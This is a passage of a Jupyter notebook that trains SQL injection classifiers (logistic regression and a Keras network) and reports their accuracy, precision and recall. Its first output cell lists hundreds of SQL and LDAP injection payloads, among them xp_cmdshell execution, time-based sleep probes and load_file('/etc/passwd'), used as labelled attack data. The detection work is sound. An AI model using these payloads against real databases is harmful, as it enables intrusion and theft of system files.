       " ',@variable',\n",
       " 'PRINT',\n",
       " 'PRINT @@variable',\n",
       " 'select',\n",
       " 'insert',\n",
       " 'as',\n",
       " 'or',\n",
       " 'procedure',\n",
       " 'limit',\n",
       " 'order by',\n",
       " 'asc',\n",
       " 'desc',\n",
       " 'delete',\n",
       " 'update',\n",
       " 'distinct',\n",
       " 'having',\n",
       " 'truncate',\n",
       " 'replace',\n",
       " 'like',\n",
       " 'handler',\n",
       " 'bfilename',\n",
       " \"' or username like '%\",\n",
       " \"' or uname like '%\",\n",
       " \"' or userid like '%\",\n",
       " \"' or uid like '%\",\n",
       " \"' or user like '%\",\n",
       " 'exec xp',\n",
       " 'exec sp',\n",
       " \"'; exec master..xp_cmdshell\",\n",
       " \"'; exec xp_regread\",\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\",\n",
       " '--sp_password',\n",
       " '\\\\x27UNION SELECT',\n",
       " \"' UNION SELECT\",\n",
       " \"' UNION ALL SELECT\",\n",
       " \"' or  ( EXISTS ) \",\n",
       " \"'  ( select topnumeric\",\n",
       " \"'||UTL_HTTP.REQUEST\",\n",
       " '1;SELECT *',\n",
       " 'to_timestamp_tz',\n",
       " 'tz_offset',\n",
       " '<>\"\\'%; )  ( &+',\n",
       " \"' or numeric=numeric\",\n",
       " '%27 or numeric=numeric',\n",
       " ' $ ( sleep 50 ) ',\n",
       " \" 'sleep 50'\",\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " '&apos; OR',\n",
       " \"'sqlattempt1\",\n",
       " ' ( sqlattempt2 ) ',\n",
       " '|',\n",
       " '%7C',\n",
       " '*|',\n",
       " '%2A%7C',\n",
       " '* ( | ( mail = *  )  )  ',\n",
       " '%2A%28%7C%28mail%3D%2A%29%29',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " ' ( ',\n",
       " '%28',\n",
       " ' ) ',\n",
       " '%29',\n",
       " '&',\n",
       " '%26',\n",
       " '!',\n",
       " '%21',\n",
       " \"' or numeric= numericor '' = '\",\n",
       " \"' or '' = '\",\n",
       " \"x' or numeric= numericor 'x' = 'y\",\n",
       " '/',\n",
       " '//',\n",
       " '//*',\n",
       " '*/*',\n",
       " \"a' or numeric = numeric--\",\n",
       " '\"a\"\" or numeric = numeric--\"',\n",
       " \"' or numeric = 3\",\n",
       " '‘ or numeric = numeric --',\n",
       " \" )  or  ( 'x' = 'x\",\n",
       " ' or numeric=numeric',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " 'numeric)  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin (numeric ) ,ord (numeric0 ) ,hex ( char ( numeric  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( numeric )  0x730065006c00650063 ...',\n",
       " ' or 0 = 0 #',\n",
       " 'insert',\n",
       " 'numeric)  or sleep ( __TIME__ ) #',\n",
       " \" )  or  ( 'a' = 'a\",\n",
       " '; exec xp_regread',\n",
       " '*|',\n",
       " '@var select @var as var into temp end --',\n",
       " 'numeric )  )   or benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " 'asc',\n",
       " ' ( ||6 ) ',\n",
       " '\"a\"\" or numeric = numeric--\"',\n",
       " '\" or benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " '# from wapiti',\n",
       " ' or 0 = 0 --',\n",
       " \"numericwaitfor delay '0:0:10'--\",\n",
       " \" or 'a' = 'a\",\n",
       " 'hi or numeric= numeric--\"',\n",
       " 'or a  =  a',\n",
       " ' UNION ALL SELECT',\n",
       " \" )  or sleep ( __TIME__ )  = '\",\n",
       " '  )  )   or benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " \"hi' or 'a' = 'a\",\n",
       " '0',\n",
       " '2numeric%',\n",
       " 'limit',\n",
       " ' or numeric=numeric',\n",
       " ' or numeric >numeric',\n",
       " '\"  )  )   or benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " 'PRINT',\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " ' or numeric = 3',\n",
       " \"  )  )  ;waitfor delay '0:0:__TIME__'--\",\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " '1; ( load_file ( char ( 47,10numeric,116,99,47,112,97,115, ...',\n",
       " 'or numeric=numeric',\n",
       " 'numericor sleep ( __TIME__ ) #',\n",
       " 'or numeric=numeric',\n",
       " ' and numericin  ( select var from temp ) --',\n",
       " \" or 'numeric' = 'numeric\",\n",
       " \" or 'text'  =  n'text'\",\n",
       " ' --',\n",
       " \" or numeric= numericor '' = '\",\n",
       " 'declare @s varchar  ( numeric )  select @s  =  0x73656c6 ...',\n",
       " 'exec xp',\n",
       " \"; exec master..xp_cmdshell '172.10.1.255'--\",\n",
       " '3.10E+17',\n",
       " '\" or pg_sleep ( __TIME__ ) --',\n",
       " \"x' AND email IS NULL; --\",\n",
       " '&',\n",
       " \"admin' or '\",\n",
       " \" or 'unusual'  =  'unusual'\",\n",
       " '//',\n",
       " 'truncate',\n",
       " 'numeric)  or benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " '\\\\x27UNION SELECT',\n",
       " 'declare @s varchar ( numeric )  select @s  =  0x77616974 ...',\n",
       " 'tz_offset',\n",
       " 'sqlvuln',\n",
       " '\"  )  )  ;waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '||6',\n",
       " 'or numeric= numeric--',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " 'or a = a',\n",
       " ' )  union select * from information_schema.tables;',\n",
       " 'PRINT @@variable',\n",
       " 'or isNULL (numeric/0 )  /*',\n",
       " '26 %',\n",
       " '\" or \"a\" = \"a',\n",
       " ' ( sqlvuln ) ',\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " ' or numeric=numeric--',\n",
       " ' and numeric=  (  if  (  (  load_file ( char (numeric10,46,10numeric,120,1numeric...',\n",
       " '0x770061006900740066006F0072002000640065006C00 ...',\n",
       " \" 'sleep 50'\",\n",
       " 'as',\n",
       " 'numeric )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '/**/or/**/1/**/ = /**/1',\n",
       " ' union all select @@version--',\n",
       " ',@variable',\n",
       " ' ( sqlattempt2 ) ',\n",
       " ' or  ( EXISTS ) ',\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.googl ...\",\n",
       " ' $ ( sleep 50 ) ',\n",
       " 'numericor benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " \" or '' = '\",\n",
       " '||UTL_HTTP.REQUEST',\n",
       " ' or pg_sleep ( __TIME__ ) --',\n",
       " \"hi' or 'x' = 'x';\",\n",
       " '\" )  or sleep ( __TIME__ )  = \"',\n",
       " \" or 'whatever' in  ( 'whatever' ) \",\n",
       " \"; begin declare @var varchar ( 8000 )  set @var = ' ...\",\n",
       " \" union select numeric,load_file ( '/etc/passwd' ) ,numeric,numeric,1;\",\n",
       " '0x77616974666F7 numeric 064656C61792027303A303A313027 ...',\n",
       " 'exec ( @s ) ',\n",
       " ' )  or pg_sleep ( __TIME__ ) --',\n",
       " ' union select',\n",
       " ' or sleep ( __TIME__ ) #',\n",
       " ' select * from information_schema.tables--',\n",
       " \"a' or numeric=numeric--\",\n",
       " \"a' or 'a'  =  'a\",\n",
       " 'declare @s varchar (  numeric  )  select @s  = ',\n",
       " ' or numeric between numericand 3',\n",
       " ' or a = a--',\n",
       " \" or 'numeric' = 'numeric\",\n",
       " '|',\n",
       " \" or sleep ( __TIME__ )  = '\",\n",
       " \" or numeric--'\",\n",
       " 'or 0 = 0 #\"',\n",
       " 'having',\n",
       " \"a'\",\n",
       " '\" or isNULL (numeric/0 )  /*',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c ...',\n",
       " 'â\\x80\\x98 or numeric= numeric--',\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " 'order by',\n",
       " 'bfilename',\n",
       " ' having numeric=numeric--',\n",
       " ' )  or benchmark (numeric0000000,MD5 ( numeric )  )  #',\n",
       " ' or username like char ( numeric ) ;',\n",
       " \";waitfor delay '0:0:__TIME__'--\",\n",
       " '\" or numeric=numeric--',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " '*/*',\n",
       " \" or 'text' > 't'\",\n",
       " '  ( select topnumeric',\n",
       " ...]"
      ]
     },
     "execution_count": 109,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_sqli_sentence"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Combination of benign an attack data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [],
   "source": [
    "values=[]\n",
    "for i in all_sqli_sentence:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in data:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.DataFrame(values,columns=['Sentence','Label'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4200"
      ]
     },
     "execution_count": 114,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(\"a' \", 1)"
      ]
     },
     "execution_count": 115,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "values[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4200"
      ]
     },
     "execution_count": 116,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)+len(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>Label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>a</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>a'</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>a' --</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>a' or numeric=numeric; --</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>@</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                    Sentence  Label\n",
       "0                          a      1\n",
       "1                        a'       1\n",
       "2                      a' --      1\n",
       "3  a' or numeric=numeric; --      1\n",
       "4                          @      1"
      ]
     },
     "execution_count": 117,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Save data as csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv('sqli.csv', index=False, encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.read_csv('sqli.csv',encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "from sklearn.feature_extraction.text import CountVectorizer\n",
    "vectorizer = CountVectorizer( min_df=2, max_df=0.7, stop_words=stopwords.words('english'))\n",
    "posts = vectorizer.fit_transform(df['Sentence'].values.astype('U')).toarray()\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4200, 4726)"
      ]
     },
     "execution_count": 119,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "posts.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [],
   "source": [
    "transformed_posts=pd.DataFrame(posts)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.concat([df,transformed_posts],axis=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [],
   "source": [
    "X=df[df.columns[2:]]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {},
   "outputs": [],
   "source": [
    "y=df['Label']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.model_selection import train_test_split"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [],
   "source": [
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4200, 4726)"
      ]
     },
     "execution_count": 126,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "clf = LogisticRegression(random_state=0).fit(X_train, y_train)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.metrics import accuracy_score"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {},
   "outputs": [],
   "source": [
    "y_pred=clf.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9380952380952381"
      ]
     },
     "execution_count": 130,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "accuracy_score(y_test, y_pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i,j in zip(y_test,y_pred):\n",
    "    print(i==j)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [],
   "source": [
    "from keras.models import Sequential\n",
    "from keras import layers\n",
    "from keras.preprocessing.text import Tokenizer\n",
    "from keras.wrappers.scikit_learn import KerasClassifier"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [],
   "source": [
    "input_dim = X_train.shape[1]  # Number of features\n",
    "\n",
    "model = Sequential()\n",
    "model.add(layers.Dense(20, input_dim=input_dim, activation='relu'))\n",
    "model.add(layers.Dense(10,  activation='tanh'))\n",
    "# model.add(layers.Flatten())\n",
    "model.add(layers.Dense(1024, activation='relu'))\n",
    "\n",
    "model.add(layers.BatchNormalization())\n",
    "model.add(layers.Dropout(0.5))\n",
    "model.add(layers.Dense(1, activation='sigmoid'))\n",
    "# model.add(Activation('softmax'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"sequential_2\"\n",
      "_________________________________________________________________\n",
      "Layer (type)                 Output Shape              Param #   \n",
      "=================================================================\n",
      "dense_5 (Dense)              (None, 20)                94540     \n",
      "_________________________________________________________________\n",
      "dense_6 (Dense)              (None, 10)                210       \n",
      "_________________________________________________________________\n",
      "dense_7 (Dense)              (None, 1024)              11264     \n",
      "_________________________________________________________________\n",
      "batch_normalization_2 (Batch (None, 1024)              4096      \n",
      "_________________________________________________________________\n",
      "dropout_2 (Dropout)          (None, 1024)              0         \n",
      "_________________________________________________________________\n",
      "dense_8 (Dense)              (None, 1)                 1025      \n",
      "=================================================================\n",
      "Total params: 111,135\n",
      "Trainable params: 109,087\n",
      "Non-trainable params: 2,048\n",
      "_________________________________________________________________\n"
     ]
    }
   ],
   "source": [
    "model.compile(loss='binary_crossentropy', \n",
    "              optimizer='adam', \n",
    "              metrics=['accuracy'])\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Train on 3360 samples, validate on 840 samples\n",
      "Epoch 1/10\n",
      "3360/3360 [==============================] - 4s 1ms/step - loss: 0.2045 - accuracy: 0.9089 - val_loss: 0.6578 - val_accuracy: 0.7000\n",
      "Epoch 2/10\n",
      "3360/3360 [==============================] - 2s 491us/step - loss: 0.1132 - accuracy: 0.9518 - val_loss: 0.4907 - val_accuracy: 0.7107\n",
      "Epoch 3/10\n",
      "3360/3360 [==============================] - 2s 486us/step - loss: 0.0988 - accuracy: 0.9592 - val_loss: 0.0796 - val_accuracy: 0.9690\n",
      "Epoch 4/10\n",
      "3360/3360 [==============================] - 2s 499us/step - loss: 0.0752 - accuracy: 0.9693 - val_loss: 0.0649 - val_accuracy: 0.9714\n",
      "Epoch 5/10\n",
      "3360/3360 [==============================] - 2s 519us/step - loss: 0.0802 - accuracy: 0.9696 - val_loss: 0.0635 - val_accuracy: 0.9702\n",
      "Epoch 6/10\n",
      "3360/3360 [==============================] - 2s 543us/step - loss: 0.0828 - accuracy: 0.9667 - val_loss: 0.0690 - val_accuracy: 0.9702\n",
      "Epoch 7/10\n",
      "3360/3360 [==============================] - 2s 492us/step - loss: 0.0767 - accuracy: 0.9693 - val_loss: 0.0747 - val_accuracy: 0.9690\n",
      "Epoch 8/10\n",
      "3360/3360 [==============================] - 2s 504us/step - loss: 0.0628 - accuracy: 0.9747 - val_loss: 0.0601 - val_accuracy: 0.9702\n",
      "Epoch 9/10\n",
      "3360/3360 [==============================] - 2s 522us/step - loss: 0.0729 - accuracy: 0.9702 - val_loss: 0.0610 - val_accuracy: 0.9714\n",
      "Epoch 10/10\n",
      "3360/3360 [==============================] - 2s 509us/step - loss: 0.0721 - accuracy: 0.9696 - val_loss: 0.0731 - val_accuracy: 0.9702\n"
     ]
    }
   ],
   "source": [
    "classifier_nn = model.fit(X_train,y_train,\n",
    "                    epochs=10,\n",
    "                    verbose=True,\n",
    "                    validation_data=(X_test, y_test),\n",
    "                    batch_size=15)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [],
   "source": [
    "pred=model.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(pred)):\n",
    "    if pred[i]>0.5:\n",
    "        pred[i]=1\n",
    "    elif pred[i]<=0.5:\n",
    "        pred[i]=0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9702380952380952"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "accuracy_score(y_test,pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i,j in zip(y_test,pred):\n",
    "    print(i==j)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Confusion Matrix\n",
    "#### Assumption:\n",
    "1. SQLI attack type is positive"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {},
   "outputs": [],
   "source": [
    "def accuracy_function(tp,tn,fp,fn):\n",
    "    \n",
    "    accuracy = (tp+tn) / (tp+tn+fp+fn)\n",
    "    \n",
    "    return accuracy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {},
   "outputs": [],
   "source": [
    "def precision_function(tp,fp):\n",
    "    \n",
    "    precision = tp / (tp+fp)\n",
    "    \n",
    "    return precision"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [],
   "source": [
    "def recall_function(tp,fn):\n",
    "    \n",
    "    recall=tp / (tp+fn)\n",
    "    \n",
    "    return recall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [],
   "source": [
    "def confusion_matrix(truth,predicted):\n",
    "    \n",
    "    true_positive = 0\n",
    "    true_negative = 0\n",
    "    false_positive = 0\n",
    "    false_negative = 0\n",
    "    \n",
    "    for true,pred in zip(truth,predicted):\n",
    "        if true == 1:\n",
    "            if pred == true:\n",
    "                true_positive += 1\n",
    "            elif pred != true:\n",
    "                false_negative += 1\n",
    "\n",
    "        elif true == 0:\n",
    "            if pred == true:\n",
    "                true_negative += 1\n",
    "            elif pred != true:\n",
    "                false_positive += 1\n",
    "            \n",
    "    accuracy=accuracy_function(true_positive, true_negative, false_positive, false_negative)\n",
    "    precision=precision_function(true_positive, false_positive)\n",
    "    recall=recall_function(true_positive, false_negative)\n",
    "    \n",
    "    return (accuracy,\n",
    "            precision,\n",
    "           recall)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 142,
   "metadata": {},
   "outputs": [],
   "source": [
    "accuracy,precision,recall=confusion_matrix(y_test,pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Accuracy : 0.9702380952380952 \n",
      " Precision : 0.9157509157509157 \n",
      " Recall : 0.9920634920634921\n"
     ]
    }
   ],
   "source": [
    "print(\" Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 144,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9157509157509157"
      ]
     },
     "execution_count": 144,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "from sklearn.metrics import precision_score\n",
    "precision_score(y_test, pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9920634920634921"
      ]
     },
     "execution_count": 145,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from sklearn.metrics import recall_score\n",
    "recall_score(y_test, pred)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
